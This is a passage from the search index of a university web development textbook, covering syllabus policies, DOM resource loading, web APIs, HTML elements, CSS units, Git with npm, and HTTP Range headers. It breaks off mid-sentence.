mentors. Additionally, you may use code snippets and algorithms found in textbooks and web sources if you clearly label them with comments indicating where the code came from and how it is being used in your project.\nYou should restrict your use of code libraries to those specified in the assignment description or approved by the instructor. You can ask for approval via Discord in the course channel, and if granted, this approval is valid for the entire class for the specified assignment.\nInfo\nWhile code libraries are an important and common tool in professional practice, at this point in your learning they can obscure how tasks are being accomplished, leaving your foundational knowledge incomplete. It is for this reason that we restrict the use of code libraries in the course.\nStandard Syllabus Statements Info\nThe statements below are standard syllabus statements from K-State and our program.\nStudents with Disabilities Students with disabilities who need classroom accommodations, access to technology, or information about emergency building/campus evacuation processes should contact the Student Access Center and/or their instructor. Services are available to students with a wide range of disabilities including, but not limited to, physical disabilities, medical conditions, learning disabilities, attention deficit disorder, depression, and anxiety. If you are a student enrolled in campus/online courses through the Manhattan or Olathe campuses, contact the Student Access Center at accesscenter@k-state.edu, 785-532-6441; for K-State Polytechnic campus, contact Julie Rowe, Diversity, Inclusion and Access Coordinator, at jarowe@ksu.edu or call 785-826-2971.\nExpectations for Conduct All student activities in the University, including this course, are governed by the Student Judicial Conduct Code as outlined in the Student Governing Association By Laws, Article V, Section 3, number 2. Students who engage in behavior that disrupts the learning environment may be asked to leave the class.\nMutual Respect and Inclusion in K-State Teaching \u0026amp; Learning Spaces At K-State, faculty and staff are committed to creating and maintaining an inclusive and supportive learning environment for students from diverse backgrounds and perspectives. K-State courses, labs, and other virtual and physical learning spaces promote equitable opportunity to learn, participate, contribute, and succeed, regardless of age, race, color, ethnicity, nationality, genetic information, ancestry, disability, socioeconomic status, military or veteran status, immigration status, Indigenous identity, gender identity, gender expression, sexuality, religion, culture, as well as other social identities.\nFaculty and staff are committed to promoting equity and believe the success of an inclusive learning environment relies on the participation, support, and understanding of all students. Students are encouraged to share their views and lived experiences as they relate to the course or their course experience, while recognizing they are doing so in a learning environment in which all are expected to engage with respect to honor the rights, safety, and dignity of others in keeping with the (K-State Principles of Community)[https://www.k-state.edu/about/values/community/].\nIf you feel uncomfortable because of comments or behavior encountered in this class, you may bring it to the attention of your instructor, advisors, and/or mentors. If you have questions about how to proceed with a confidential process to resolve concerns, please contact the Student Ombudsperson Office. Violations of the student code of conduct can be reported here. If you experience bias or discrimination, it can be reported here.\nNetiquette Info\nThis is our personal policy and not a required syllabus statement from K-State. It has been adapted from this statement from K-State Global Campus, and the Recurse Center Manual. We have adapted their ideas to fit this course.\nOnline communication is inherently different than in-person communication. When speaking in person, many times we can take advantage of the context and body language of the person speaking to better understand what the speaker means, not just what is said. This information is not present when communicating online, so we must be much more careful about what we say and how we say it in order to get our meaning across.\nHere are a few general rules to help us all communicate online in this course, especially while using tools such as Canvas or Discord:\nUse a clear and meaningful subject line to announce your topic. Subject lines such as \u0026ldquo;Question\u0026rdquo; or \u0026ldquo;Problem\u0026rdquo; are not helpful. Subjects such as \u0026ldquo;Logic Question in Project 5, Part 1 in Java\u0026rdquo; or \u0026ldquo;Unexpected Exception when Opening Text File in Python\u0026rdquo; give plenty of information about your topic. Use only one topic per message. If you have multiple topics, post multiple messages so each one can be discussed independently. Be thorough, concise, and to the point. Ideally, each message should be a page or less. Include exact error messages, code snippets, or screenshots, as well as any previous steps taken to fix the problem. It is much easier to solve a problem when the exact error message or screenshot is provided. If we know what you\u0026rsquo;ve tried so far, we can get to the root cause of the issue more quickly. Consider carefully what you write before you post it. Once a message is posted, it becomes part of the permanent record of the course and can easily be found by others. If you are lost, don\u0026rsquo;t know an answer, or don\u0026rsquo;t understand something, speak up! Email and Canvas both allow you to send a message privately to the instructors, so other students won\u0026rsquo;t see that you asked a question. Don\u0026rsquo;t be afraid to ask questions anytime, as you can choose to do so without any fear of being identified by your fellow students. Class discussions are confidential. Do not share information from the course with anyone outside of the course without explicit permission. Do not quote entire message chains; only include the relevant parts. When replying to a previous message, only quote the relevant lines in your response. Do not use all caps. It makes it look like you are shouting. Use appropriate text markup (bold, italics, etc.) to highlight a point if needed. No feigning surprise. If someone asks a question, saying things like \u0026ldquo;I can\u0026rsquo;t believe you don\u0026rsquo;t know that!\u0026rdquo; are not helpful, and only serve to make that person feel bad. No \u0026ldquo;well-actually\u0026rsquo;s.\u0026rdquo; If someone makes a statement that is not entirely correct, resist the urge to offer a \u0026ldquo;well, actually\u0026hellip;\u0026rdquo; correction, especially if it is not relevant to the discussion. If you can help solve their problem, feel free to provide correct information, but don\u0026rsquo;t post a correction just for the sake of being correct. Do not correct someone\u0026rsquo;s grammar or spelling. Again, it is not helpful, and only serves to make that person feel bad. If there is a genuine mistake that may affect the meaning of the post, please contact the person privately or let the instructors know privately so it can be resolved. Avoid subtle -isms and microaggressions. Avoid comments that could make others feel uncomfortable based on their personal identity. See the syllabus section on Diversity and Inclusion above for more information on this topic. If a comment makes you uncomfortable, please contact the instructor. Avoid sarcasm, flaming, advertisements, lingo, trolling, doxxing, and other bad online habits. They have no place in an academic environment. Tasteful humor is fine, but sarcasm can be misunderstood. As a participant in course discussions, you should also strive to honor the diversity of your classmates by adhering to the K-State Principles of Community.\nFace Coverings All students are expected to comply with K-State’s face mask policy. As of August 2, 2021, everyone must wear face masks over their mouths and noses in all indoor spaces on university property, including while attending in-person classes. This policy is subject to change at the university’s discretion. For additional information and the latest on K-State’s face covering policy, see this page.\nAcademic Freedom Statement Kansas State University is a community of students, faculty, and staff who work together to discover new knowledge, create new ideas, and share the results of their scholarly inquiry with the wider public. Although new ideas or research results may be controversial or challenge established views, the health and growth of any society requires frank intellectual exchange. Academic freedom protects this type of free exchange and is thus essential to any university\u0026rsquo;s mission.\nMoreover, academic freedom supports collaborative work in the pursuit of truth and the dissemination of knowledge in an environment of inquiry, respectful debate, and professionalism. Academic freedom is not limited to the classroom or to scientific and scholarly research, but extends to the life of the university as well as to larger social and political questions. It is the right and responsibility of the university community to engage with such issues.\nCampus Safety Kansas State University is committed to providing a safe teaching and learning environment for student and faculty members. In order to enhance your safety in the unlikely case of a campus emergency make sure that you know where and how to quickly exit your classroom and how to follow any emergency directives. To view additional campus emergency information go to the University\u0026rsquo;s main page, www.k-state.edu, and click on the Emergency Information button, located at the bottom of the page.\nStudent Resources K-State has many resources to help contribute to student success. These resources include accommodations for academics, paying for college, student life, health and safety, and others found at www.k-state.edu/onestop.\nStudent Academic Creations Student academic creations are subject to Kansas State University and Kansas Board of Regents Intellectual Property Policies. For courses in which students will be creating intellectual property, the K-State policy can be found at University Handbook, Appendix R: Intellectual Property Policy and Institutional Procedures (part I.E.). These policies address ownership and use of student academic creations.\nMental Health Your mental health and good relationships are vital to your overall well-being. Symptoms of mental health issues may include excessive sadness or worry, thoughts of death or self-harm, inability to concentrate, lack of motivation, or substance abuse. Although problems can occur anytime for anyone, you should pay extra attention to your mental health if you are feeling academic or financial stress, discrimination, or have experienced a traumatic event, such as loss of a friend or family member, sexual assault or other physical or emotional abuse.\nIf you are struggling with these issues, do not wait to seek assistance.\nKansas State University Counseling Services offers free and confidential services to assist you to meet these challenges. Lafene Health Center has specialized nurse practitioners to assist with mental health. The Office of Student Life can direct you to additional resources. K-State Family Center offers individual, couple, and family counseling services on a sliding fee scale. Center for Advocacy, Response, and Education (CARE) provides free and confidential assistance for those in our K-State community who have been victimized by violence. For Kansas State Polytechnic Campus:\nKansas State Polytechnic Counseling Services offers free and confidential services to assist you to meet these challenges. The Kansas State Polytechnic Office of Student Life can direct you to additional resources. University Excused Absences K-State has a University Excused Absence policy (Section F62). Class absence(s) will be handled between the instructor and the student unless there are other university offices involved. For university excused absences, instructors shall provide the student the opportunity to make up missed assignments, activities, and/or attendance specific points that contribute to the course grade, unless they decide to excuse those missed assignments from the student’s course grade. Please see the policy for a complete list of university excused absences and how to obtain one. Students are encouraged to contact their instructor regarding their absences.\nCopyright Notice © The materials in this online course fall under the protection of all intellectual property, copyright and trademark laws of the U.S. The digital materials included here come with the legal permissions and releases of the copyright holders. These course materials should be used for educational purposes only; the contents should not be distributed electronically or otherwise beyond the confines of this online course. The URLs listed here do not suggest endorsement of either the site owners or the contents found at the sites. Likewise, mentioned brands (products and services) do not suggest endorsement. Students own copyright to what they create.\nOriginal content in the course textbook at https://textbooks.cs.ksu.edu/cis526 is licensed under a Creative Commons BY-SA license by Nathan Bean unless otherwise stated.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/01-the-dom/06-dom-resource-loading/",
	"title": "The DOM and External Resource Loading",
	"tags": [],
	"description": "",
	"content": "One of the important aspects of working with HTML is understanding that an HTML page is more than just the HTML. It also involves a collection of resources that are external to the HTML document, but displayed or utilized by the document. These include elements like \u0026lt;link\u0026gt;, \u0026lt;script\u0026gt;, \u0026lt;video\u0026gt;, \u0026lt;img\u0026gt;, and \u0026lt;source\u0026gt; with src or href attributes set.\nAs the DOM tree is parsed and loaded and these external resources are encountered, the browser requests those resources as well. Modern browsers typically make these requests in parallel for faster loading times.\nOnce the HTML document has been completely parsed, the window triggers the DOMContentLoaded event. This means the HTML document has been completely parsed and added to the DOM tree. However, the external resources may not have all been loaded at this point.\nOnce those resources are loaded, a separate Load event is triggered, also on the window.\nThus, if you have JavaScript that should only be invoked after the page has fully loaded, you can place it inside an event listener tied to the load event, i.e.:\nwindow.addEventListener(\u0026#39;load\u0026#39;, function(event) { // TODO: Add your code here ... }); Or, if you want it invoked after the DOM is fully parsed, but external resources may still be loading:\nwindow.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, function(event) { // TODO: Add your code here ... }); The former - waiting for all resources to load - tends to be the most common. The reason is simple, if you are loading multiple JavaScript files, i.e. a couple of libraries and your own custom code, using the 'load' event ensures they have all loaded before you start executing your logic.\nConsider the popular JQuery library, which provides shorthand methods for querying and modifying the DOM. It provides a JQuery() function that is also aliased to the $. The JQuery code to show a popup element might be:\n$(\u0026#39;#popup\u0026#39;).show(); But if the JQuery library isn\u0026rsquo;t loaded yet, the $ is not defined, and this logic will crash the JavaScript interpreter. Any remaining JavaScript will be ignored, and your page won\u0026rsquo;t work as expected. But re-writing that to trigger after all resources have loaded, i.e.:\nwindow.addEventListener(\u0026#39;load\u0026#39;, function(event) { // This code only is executed once all resources have been loaded $(\u0026#39;#popup\u0026#39;).show(); }); Ensures the JQuery library is available before your code is run.\nInfo\nJavaScript is an extremely flexible language that has evolved over time. One side effect of this evolution is that there are often multiple ways to express the same idea. For example, listening for the window\u0026rsquo;s 'load' event can be written many different ways:\n// Using the onload property window.onload = function(event) {...} // Using onload property and lambda syntax window.onload = (event) =\u0026gt; {...} // Using the addEventListener and lambda syntax window.addEventListener(\u0026#39;load\u0026#39;, (event) =\u0026gt; { ... }); // Using the JQuery library JQuery(function(){...}); // Using the JQuery library with lambda syntax JQuery(() =\u0026gt; {...}); // Using the JQuery library with $ alias $(function(){...}); You are free to use whichever approach you like, but need to be able to interpret other programmers\u0026rsquo; code when they use a different approach.\nLoading Resources after the DOM is loaded There are really two ways to load resources into an HTML page from your JavaScript code. One is indirect, and the other direct. The indirect method simply involves creating DOM elements linked to an outside resource, i.e.:\nvar image = document.createElement(\u0026#39;img\u0026#39;); image.src = \u0026#39;smile.png\u0026#39;; document.body.appendChild(img); In this case, when the new \u0026lt;img\u0026gt; element has its src attribute set, the image is requested by the browser. Attaching it to the DOM will result in the image being displayed once it loads.\nIf we want to know when the image is loaded, we can use the load event:\nvar image = document.createElement(\u0026#39;img\u0026#39;); image.addEventListener(\u0026#39;load\u0026#39;, function(event){ console.log(\u0026#39;loaded image\u0026#39;); }); image.src = \u0026#39;smile.png\u0026#39;; Notice too that we add the event listener before we set the src attribute. If we did it the other way around, the resource may already be loaded before the listener takes effect - and it would never be invoked!\nHowever, this approach can be cumbersome, and limits us to what resources can be bound to HTML elements. For more flexibility, we need to make the request directly, using AJAX. We\u0026rsquo;ll take a look at doing so after we cover HTTP in more depth.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/",
	"title": "Dynamic Web Servers",
	"tags": [],
	"description": "",
	"content": "Chapter 6 Dynamic Web Servers The Web Comes of Age\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/08-routing/07-apis/",
	"title": "APIs",
	"tags": [],
	"description": "",
	"content": "Before we step away from routing, we should take the time to discuss a specific style of web application that goes hand-in-hand with routing - an Application Programming Interface (API). An API is simply a interface for two programs to communicate, to allow one to act as a service for the other. Web APIs are APIs that use hyper-text transfer protocol (http) as the mechanism for this communication. Thus, the client program makes HTTP requests against the API server and receives responses. The Placeholder.com we discussed earlier in this chapter is an example of a web API - one that generates and serves placeholder images.\nIn fact, an API can serve any kind of resource - binary files, image files, text files, etc. But most serve data in one of a few forms:\nHTML that is intended to be embedded in a web page, common to advertisement revenue services, embeddable social media feeds, YouTube and other video embedding sites. Data structured as JSON, a very common format for submitting or retrieving any kind of data across the web. For data that will be used by JavaScript running in the browser, it has the advantage of being the native format. Data structured as XML, another common format, XML tends to be slightly larger than the equivalent JSON, but it can have a published and enforced structure. Some Example Web APIs There are thousands of Web APIs available for you to work with. Some you might be interested in investigating include:\nThe National Weather Service API - we used this API early in the course to retrieve weather forecast data. As the NWS is supported by tax dollars, this resource is free to use. Census APIs similarly, the U.S. Census Bureau makes much of their data sets available through APIs NASA APIs as does NASA. Google Maps has extensive APIs for maps and geolocation, with a fee structure. Open Street Maps offers an open-source alternative. Facebook has a large collection of APIs for working with their data and navigating social network relationships. GitHub provides an API for developing tools to work with their site. "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/a-html/07-common-elements/",
	"title": "Common HTML Elements",
	"tags": [],
	"description": "",
	"content": "This page details some of the most commonly used HTML elements. For a full reference, see MDN\u0026rsquo;s HTML Element Reference.\nDocument-Level Elements These elements describe the basic structure of the HTML document.\n\u0026lt;html\u0026gt; The \u0026lt;html\u0026gt; element contains the entire HTML document. It should have exactly two children, the \u0026lt;head\u0026gt; and the \u0026lt;body\u0026gt; elements, appearing in that order.\n\u0026lt;head\u0026gt; The \u0026lt;head\u0026gt; element contains any metadata describing the document. The most common children elements are \u0026lt;title\u0026gt;, \u0026lt;meta\u0026gt;, and \u0026lt;link\u0026gt;.\n\u0026lt;body\u0026gt; The \u0026lt;body\u0026gt; element should be the second child of the \u0026lt;html\u0026gt; element. It contains the actual rendered content of the page, typically as nested HTML elements and text. Elements that appear in the body can define structure, organize content, embed media, and play many other roles.\nMetadata Elements These elements add properties to the document.\n\u0026lt;link\u0026gt; The \u0026lt;link\u0026gt; element links to an external resource using the href attribute and defines that resource\u0026rsquo;s relationship with the document with the rel attibute.\nThis is most commonly used to link a stylesheet which will modify how the page is rendered by the browser (see the chapter on CSS). A stylesheet link takes the form:\n\u0026lt;link href=\u0026quot;path-to-stylesheet.css\u0026quot; rel=\u0026quot;stylesheet\u0026quot;/\u0026gt;\nIt can also be used to link a favicon (the icon that appears on your browser tab):\n\u0026lt;link rel=\u0026quot;icon\u0026quot; type=\u0026quot;image/x-icon\u0026quot; href=\u0026quot;http://example.com/favicon.ico\u0026quot; /\u0026gt;\n\u0026lt;meta\u0026gt; The \u0026lt;meta\u0026gt; elements is used to describe metadata not covered by other elements. In the early days, its most common use was to list keywords for the website for search engines to use:\n\u0026lt;meta keywords=\u0026quot;html html5 web development webdev\u0026quot;/\u0026gt;\nHowever, this was greatly abused and search engines have stopped relying on them. One of the most common uses today is to set the viewport to the size of the rendering device for responsive design (see the chapter on responsive design):\n\u0026lt;meta name=\u0026quot;viewport\u0026quot; content=\u0026quot;width=device-width, initial-scale=1.0\u0026quot;\u0026gt;\nAlso, best practice is to author HTML documents in utf-8 character format and specify that encoding with a metadata tag with the charset attribute:\n\u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt;\n\u0026lt;style\u0026gt; The style element allows for embedding CSS text directly into the head section of the HTML page. The Separation of Concerns discussion discusses the appropriateness of using this approach.\n\u0026lt;title\u0026gt; The \u0026lt;title\u0026gt; element should only appear once in the \u0026lt;head\u0026gt; element, and its content should be text (no HTML elements). It specifies the title of the document. In modern browsers, the title is displayed on the browser tab displaying the document. In earlier browsers, it would appear in the window title bar.\nSectioning Elements Many HTML Elements help define the structure of the document by breaking it into sections. These are intended to hold other elements and text. These elements are block type elements.\nheadings The \u0026lt;h1\u0026gt;, \u0026lt;h2\u0026gt;, \u0026lt;h3\u0026gt;, \u0026lt;h4\u0026gt;, \u0026lt;h5\u0026gt;, and \u0026lt;h6\u0026gt; elements are headings and subheadings with six possible levels of nesting. They are used to enclose the title of the section.\n\u0026lt;main\u0026gt; A \u0026lt;main\u0026gt; element identifies the content most central in the page. There should be only one per page (or, if multiple main elements are used, the others should have their visible attribute set to false).\n\u0026lt;aside \u0026gt; An \u0026lt;aside\u0026gt; element identifies content separate from the main focus of the page. It can be used for callouts, advertisements, and the like.\n\u0026lt;article\u0026gt; An \u0026lt;article\u0026gt; element identifies a stand-alone piece of content. Unlike an aside, it is intended for syndication (reprinting) in other forms.\n\u0026lt;header\u0026gt; The \u0026lt;header\u0026gt; element identifies a header for the page, often containing the site banner, navigation, etc.\n\u0026lt;footer\u0026gt; The \u0026lt;footer\u0026gt; element identifies a footer for the page, often containing copyright and contact information.\n\u0026lt;nav\u0026gt; The \u0026lt;nav\u0026gt; element typically contains navigation links and/or menus.\n\u0026lt;section\u0026gt; A \u0026lt;section\u0026gt; element is a general-purpose container for sectioning a page where a more specific container does not make sense.\nText Content These HTML elements are used to organize text content. Each of these is a block element, meaning it breaks up the flow of text on the page.\n\u0026lt;blockquote\u0026gt; The \u0026lt;blockquote\u0026gt; is used to contain a long quotation.\n\u0026lt;figure\u0026gt; The \u0026lt;figure\u0026gt; is used to contain a figure (typically a \u0026lt;img\u0026gt; or other media element).\n\u0026lt;figcaption\u0026gt; The \u0026lt;figcaption\u0026gt; provides a caption for a figure\n\u0026lt;hr\u0026gt; The \u0026lt;hr\u0026gt; provides a horizontal rule (line) to separate text.\nlists There are three types of lists available in HTML, ordered, unordered, and definition. Ordered lists number their contents, and consist of list item elements (\u0026lt;li\u0026gt;) nested in an ordered list element (\u0026lt;ol\u0026gt;). Unordered lists are bulleted, and consist of list item elements (\u0026lt;li\u0026gt;) nested in an unordered list element (\u0026lt;ul\u0026gt;). List items can contain any kind of HTML elements, not just text.\nDefinition lists nest a definition term (\u0026lt;dt\u0026gt;) and its corresponding definition (\u0026lt;dd\u0026gt;) inside a definition list (\u0026lt;dl\u0026gt;) element. While rarely used, they can be handy when you want to provide lists of definitions (as in a glossary) in a way a search engine will recognize.\n\u0026lt;div\u0026gt; The \u0026lt;div\u0026gt; element provides a wrapper around text content that is normally used to attach styles to.\n\u0026lt;pre\u0026gt; The \u0026lt;pre\u0026gt; tag informs the browser that its content has been preformatted, and its contents should be displayed exactly as written (i.e. whitespace is respected, and angle brackets (\u0026lt;\u0026gt;) are rendered rather than interpreted as HTML. It is often used in conjunction with a \u0026lt;code\u0026gt; element to display source code within a webpage.\nInline Text Elements The following elements modify nested text while maintaining the flow of the page. As the name suggests, these are inline type elements.\n\u0026lt;a\u0026gt; The \u0026lt;a\u0026gt; anchor element is used to link to another document on the web (i.e. \u0026lsquo;anchoring\u0026rsquo; it). This element is what makes HTML hyper-text, so clearly it is important. It should always have a source (src) attribute defined (use \u0026quot;#\u0026quot; if you are overriding its behavior with JavaScript).\ntext callouts A number of elements seek to draw specific attention to a snippet of text, including \u0026lt;strong\u0026gt;, \u0026lt;mark\u0026gt;, \u0026lt;em\u0026gt;, \u0026lt;b\u0026gt;, \u0026lt;i\u0026gt;\n\u0026lt;strong\u0026gt; The \u0026lt;strong\u0026gt; element indicates the text is important in some way. Typically browsers will render its contents in boldface.\n\u0026lt;em\u0026gt; The \u0026lt;em\u0026gt; element indicates stress emphasis on the text. Typically a browser will render it in italics.\n\u0026lt;mark\u0026gt; The \u0026lt;mark\u0026gt; element indicates text of specific relevance. Typically the text appears highlighted.\n\u0026lt;b\u0026gt; The bring to attention element (\u0026lt;b\u0026gt;) strives to bring attention to the text. It lacks the semantic meaning of the other callouts, and typically is rendered as boldface (in early versions of HTML, it referred to bold).\n\u0026lt;i\u0026gt; The \u0026lt;i\u0026gt; element sets off the contained text for some reason other than emphasis. It typically renders as italic (in early versions of HTML, the i referred to italics).\n\u0026lt;br\u0026gt; The break element (\u0026lt;br\u0026gt;) inserts a line break into the text. This is important as all whitespace in the text of an HTML document is collapsed into a single space when interpreted by a browser.\n\u0026lt;code\u0026gt; The \u0026lt;code\u0026gt; element indicates the contained text is computer code.\n\u0026lt;span\u0026gt; The \u0026lt;span\u0026gt; element is the inline equivalent of the \u0026lt;div\u0026gt; element; it is used primarily to attach CSS rules to nested content.\nMedia Elements A number of elements bring media into the page.\n\u0026lt;img\u0026gt; The \u0026lt;img\u0026gt; element represents an image. It should have a source (src) attribute defined, consisting of a URL where the image data can be retrieved, and an alternative text (alt) attribute with text to be displayed when the image cannot be loaded or when the element is read by a screen reader.\n\u0026lt;audio\u0026gt; The \u0026lt;audio\u0026gt; element represents audio data. It should also have a source (src) attribute to provide the location of the video data. Alternatively, it can contain multiple \u0026lt;source\u0026gt; elements defining alternative forms of the video data.\n\u0026lt;video\u0026gt; The \u0026lt;video\u0026gt; element represents a video. It should also have a source (src) attribute to provide the location of the video data. Alternatively, it can contain multiple \u0026lt;source\u0026gt; elements defining alternative forms of the audio data.\n\u0026lt;source\u0026gt; The \u0026lt;source\u0026gt; element specifies one form of multimedia data, and should be nested inside a \u0026lt;video\u0026gt; or \u0026lt;audio\u0026gt; element. Providing multiple sources in this way allows the browser to use the first one it understands (as most browsers do not support all possible media formats, this allows you to serve the broadest possible audience). Each \u0026lt;source\u0026gt; element should have a source attribute (src) defining where its multimedia data can be located, as well as a type attribute defining what format the data is in.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/07-units/",
	"title": "CSS Units",
	"tags": [],
	"description": "",
	"content": "When specifying CSS rules, you often need to provide a unit of measurement. Any time you provide a measurement in a CSS rule, you must provide the units that measurement is being expressed in, following the value. For example:\n#banner { width: 300px; } sets the width of the element with id banner to 300 pixels.\nThere are actually a lot of units available in CSS, and we\u0026rsquo;ll summarize the most common in this section.\nUnits of Absolute Size Absolute units don\u0026rsquo;t change their size in relation to other settings, hence the name. The most common one encountered is pixels, which are expressed with the abbreviation px.\nOther absolute measurements include:\nq, mm, cm, in which are quarter-millimeters, millimeters, centimeters, and inches. These are rarely used outside of rules applied when printing websites.\npt, pc which are points and picas, common units of measurement within the publishing industry.\nUnits of Relative Size Relative units are based on (relative to) the font-size property of the element, the viewport size, or grid container sizes. These are expressed as proportions of the units they are relative to, i.e.\n.column { width: 30vw; } sets columns to be 30% of the width of the viewport.\nUnits Relative to Font Size Setting dimensions of borders, padding, and margins using units relative to font sizes can help make these appear consistent at different resolutions. Consider a margin of 70px - it might make sense on a screen 1024 pixels wide, but on a phone screen 300 pixels wide, nearly half the available space would be margins!\nUnits that are relative to the font-size include:\nem one em is the font-size of the current element (which may be inherited from a parent). rem is same measurement as em, but disregards inherited font sizes. Thus, it is more consistent with intent than em, and is largely displacing its use (though it is not supported in older versions of Internet Explorer). Units Relative to Viewport Size The units vh and vw refer to 1/100th the height of the viewport (the size of the screen space the page can appear within).\nIt may be helpful to think of these as the percentage of the viewport width and viewport height, and they work much like percentages. However, in specifying heights, the vh will always set the height of an element, unlike %.\nFraction Units The Grid model introduced the fraction (fr) unit, which is a fraction of the available space in a grid, after subtracting gutters and items sized in other units. See the discussion of the CSS Grid Model or CSS Tricks\u0026rsquo; A Complete Guide to Grid for more details.\nPercentage Units You can also specify percentages (%) for many properties, which are typically interpreted as a percentage of the parent element\u0026rsquo;s width or height. For example:\n.column { width: 33%; } sets elements with the class column to be 33% the width of their parent element. Similarly:\n.row { height: 20%; } sets elements with a class row to be 20% the height of their parent element.\nIf the parent does not have an explicit width, the width of the next ancestor with a supplied width is used instead, and if no ancestor has a set width, that of the viewport is used. The same is almost true of the height; however, if no elements have a specified height, then the percentage value is ignored - the element is sized according to its contents, as would be the case with height: auto.\nTip\nOne of the most frustrating lessons beginning HTML authors must learn is the difference in how width and height are handled when laying out a webpage. Using the percentage unit (%) to set the height almost never accomplishes the goal you have in mind - it only works if the containing element has a set height.\nWhile there are hacky techniques that can help, they only offer partial solutions. It is usually best not to fight the design of HTML, and adopt layouts that can flow down the page rather than have a height determined at render time.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/04-node/07-git/",
	"title": "Git",
	"tags": [],
	"description": "",
	"content": "Most Node packages are made available as git repositories, and npm has built-in support for using git.\nThe Repository Property In your package.json file, you can specify a \u0026quot;repository\u0026quot; property, which specifies where the repository for this project exists. Consider the following example of the npm command-line interface package:\n\u0026#34;repository\u0026#34;: { \u0026#34;type\u0026#34; : \u0026#34;git\u0026#34;, \u0026#34;url\u0026#34; : \u0026#34;https://github.com/npm/cli.git\u0026#34; } For many open-source projects, the repository is located on Github, a GitHub gist, BitBucket, or a GitLab instance. These can be specified with a shorthand, which matches the corresponding npm install argument:\n\u0026#34;repository\u0026#34;: \u0026#34;npm/npm\u0026#34; \u0026#34;repository\u0026#34;: \u0026#34;github:user/repo\u0026#34; \u0026#34;repository\u0026#34;: \u0026#34;gist:11081aaa281\u0026#34; \u0026#34;repository\u0026#34;: \u0026#34;bitbucket:user/repo\u0026#34; \u0026#34;repository\u0026#34;: \u0026#34;gitlab:user/repo\u0026#34; If your project folder already is set up as a git repo before you run $npm init, then the wizard will suggest using the existing repository.\nThe .gitignore File Like any git repo, there are some files you will want to exclude from version control. The most important of these is the node_modules folder, which we exclude for two reasons:\nThe folder\u0026rsquo;s contents are large, and are available from the original sources specified in your package\u0026rsquo;s dependencies - therefore they represent significant and unnecessary glut in a repository. Some portions of your dependencies may be compiled from C code as they are installed. Since C code is compiled into binaries for a specific target machine\u0026rsquo;s architecture, you will encounter errors if your development and production machines are different. Re-installing packages in the production machine with $npm install avoids this. Therefore, you should include at least this line in your .gitignore file:\nnode_modules/ It\u0026rsquo;s also a good idea to leave out any logging files:\nlogs *.log You may also want to look at GitHub\u0026rsquo;s boilerplate Node .gitignore template, which adds additional rules based on many popular Node frameworks (adding an ignore for a file or directory that doesn\u0026rsquo;t exist in your project is harmless).\nThe .gitignore file should ideally be added before the repository has been created, as files already under version control override .gitignore rules.\nInitializing the Repository Now we can initialize our repository with the $git init command in the terminal:\n$ git init Note how a .git directory is added to our project? This is where git stores the diff information that allows it to track versions of our code.\nThe init command adds the current directory structure (less that specified in the .gitignore file) to the staging list. Otherwise, we\u0026rsquo;d need to stage these files ourselves for version tracking with the git command, add .:\n$git add . Once staged, we can commit the initial version of our package with a git commit command:\n$ git commit -a -m \u0026#34;Initial commit\u0026#34; The -a flag indicates we are committing all currently staged files, alternatively you can commit files one-at-a-time, if you only want to commit one or a few files. The -m file indicates we are also adding a commit message, which follows in quotes (\u0026quot;\u0026quot;). If we don\u0026rsquo;t use this flag, then git will open a text editor to write the commit message in. For the Linux platform, the default is vi, a powerful command line text editor that has a bit of a learning curve. If you find vi has launched on you and you are uncertain how to proceed, follow these steps:\nType your commit message Hit the [ESC] key - this moves you from edit mode to command mode Type the command :wq. Vi commands always start with a colon (:), and can be grouped. The w indicates the file should be written (saved), and the q indicates we want to quit the editor. Adding Remote Repositories If you want to host your repository on GitHub or another hosting tool (such as BitBucket or GitLab), you will need to add that repository\u0026rsquo;s url as a remote origin for your local repository. You can do so with the command:\n$ git remote add origin [repo url] Where [repo url] is the url of the remote repo. If you want to use GitHub, create an empty repository, and copy the created repository\u0026rsquo;s link.\nIf you clone a repository from GitHub or another tool, the remote origin is automatically set to that parent repository. If you ever need to change the remote origin, it\u0026rsquo;s a two-step process:\nDelete the current origin with the git command:$git remote rm origin Add your new origin with the git command: $git remote add origin You can also add other targets than origin (origin is a generic target meaning the originating repository). To see all remote repositories, use the command $git remote -v, which lists all registered remote repositories (the -v flag is for verbose).\nPushing and Pulling The $git push and $git pull commands are shorthand for pushing and pulling the master branch to and from the origin repository. The full commands can be used to push an alternate branch or to reach an alternate remote repository: $git push [remote repo name] [branch name], $git pull [remote repo name] [branch name]\nGit and Codio Pushing your code to a remote repository is a good way to move it between Codio boxes. You can clone such a repository after you create it with the command:\n$ git clone [git clone url] Where the [git clone url] is the URL of your remote repository. Cloning a repository automatically sets its remote origin repo to the repository it was cloned from.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/05-web-servers/07-partial-downloads/",
	"title": "Partial Downloads",
	"tags": [],
	"description": "",
	"content": "While we normally think of downloading an entire file from the web, there are some situations where it makes sense to download only part of a file. One case is with a large file download that gets interrupted - it makes a lot of sense to start downloading the remaining bytes from where you left off, rather than starting over again. A second case is when you are streaming media; often the user may not watch or listen to the entire media file, so why download the bytes they don\u0026rsquo;t need? Or if it is a live stream, we explicitly can\u0026rsquo;t download the entire thing, because later parts do not yet exist!\nRange Headers HTTP explicitly supports requesting only a part of a resource with the Range header. This allows us to specify the unit of measure (typically bytes), a starting point, and an optional end. This header is structured:\nRange: \u0026lt;unit\u0026gt;=\u0026lt;range-start\u0026gt;-\u0026lt;range-end\u0026gt; Where \u0026lt;unit\u0026gt; is the unit of measure, the \u0026lt;range-start\u0026gt; is the start of the range to send, measured in the provided unit, and \u0026lt;range-end\u0026gt; is the end of the range to send.\nThus, a real-world Range header might look like:\nRange: bytes=200-300 You can also specify only the starting point (useful for resuming downloads):\nRange: \u0026lt;unit\u0026gt;=\u0026lt;range-start\u0026gt;- Finally, you can specify multiple ranges separated by commas:\nRange: \u0026lt;unit\u0026gt;=\u0026lt;range1-start\u0026gt;-\u0026lt;range1-end\u0026gt;, \u0026lt;range2-start\u0026gt;-\u0026lt;range2-end\u0026gt;, \u0026lt;range3-start\u0026gt;- Of course, as with all request headers, this indicates a desire 